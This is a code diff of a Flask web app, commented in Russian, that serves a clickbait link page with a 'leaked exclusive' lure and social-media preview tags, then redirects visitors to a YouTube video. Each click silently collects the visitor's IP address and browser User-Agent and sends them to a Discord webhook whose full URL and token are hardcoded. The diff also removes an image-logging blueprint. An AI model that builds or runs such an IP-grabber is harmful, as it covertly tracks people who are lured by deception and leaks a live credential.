@@ -1,10 +1,7 @@
 import os
 import logging
-from flask import Flask, request, render_template_string, jsonify, redirect
+from flask import Flask, request, render_template_string, jsonify
 import requests
-
-# Импорт Blueprint для работы с изображениями
-from api.image import image_api
 
 app = Flask(__name__)
 
@@ -17,15 +14,9 @@ CLICKBAIT_DESCRIPTION = os.environ.get(
     "CLICKBAIT_DESCRIPTION",
     "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
 )
-CLICKBAIT_IMAGE = os.environ.get(
-    "CLICKBAIT_IMAGE",
-    "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13"
-)
+CLICKBAIT_IMAGE = os.environ.get("CLICKBAIT_IMAGE", "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13")
 REAL_URL = os.environ.get("REAL_URL", "https://youtu.be/kk3_5AHEZxE?si=0RnrfrvHJIiHqes7")
-DISCORD_WEBHOOK_URL = os.environ.get(
-    "DISCORD_WEBHOOK_URL",
-    "https://discord.com/api/webhooks/1338142323795824691/ox3HgetuOjqcKx-3AO1X6mb53Y-SfS8MBt3XU2M8GLVcgfNPE85Gk2Y8e5TDVYdsKUwt"
-)
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1338142323795824691/ox3HgetuOjqcKx-3AO1X6mb53Y-SfS8MBt3XU2M8GLVcgfNPE85Gk2Y8e5TDVYdsKUwt")
 REDIRECT_DELAY = int(os.environ.get("REDIRECT_DELAY", "5"))
 
 # Глобальный счётчик кликов
@@ -57,6 +48,7 @@ def generate_link():
     """
     Генерирует ссылку на кликбейт-страницу.
     """
+    # Генерация ссылки с использованием текущего домена
     return f"Вот ваша ссылка: {request.host_url}sosish"
 
 @app.route('/sosish')
@@ -67,28 +59,34 @@ def clickbait_page():
     global click_count
     click_count += 1
 
+    # Получение информации о пользователе
     user_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent')
 
+    # Отправка уведомления в Discord
     send_discord_notification(click_count, user_ip, user_agent)
 
+    # Формирование HTML-страницы с OG-тегами и стильным оформлением
     html_content = f"""
     <!DOCTYPE html>
     <html lang="ru">
     <head>
         <meta charset="UTF-8">
         <title>{CLICKBAIT_TITLE}</title>
+
         <!-- Open Graph Meta Tags -->
         <meta property="og:title" content="{CLICKBAIT_TITLE}">
         <meta property="og:description" content="{CLICKBAIT_DESCRIPTION}">
         <meta property="og:image" content="{CLICKBAIT_IMAGE}">
         <meta property="og:url" content="{request.url}">
         <meta property="og:type" content="website">
+
         <!-- Twitter Cards -->
         <meta name="twitter:card" content="summary_large_image">
         <meta name="twitter:title" content="{CLICKBAIT_TITLE}">
         <meta name="twitter:description" content="{CLICKBAIT_DESCRIPTION}">
         <meta name="twitter:image" content="{CLICKBAIT_IMAGE}">
+
         <style>
             body {{
                 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -167,10 +165,6 @@ def stats():
     Возвращает статистику переходов в формате JSON.
     """
     return jsonify({"click_count": click_count})
-
-# Регистрация Blueprint для обработки логирования изображений.
-# Итоговый URL будет: http://your-domain.com/api/image/
-app.register_blueprint(image_api, url_prefix="/api/image")
 
 if __name__ == '__main__':
     host = os.environ.get("HOST", "0.0.0.0")
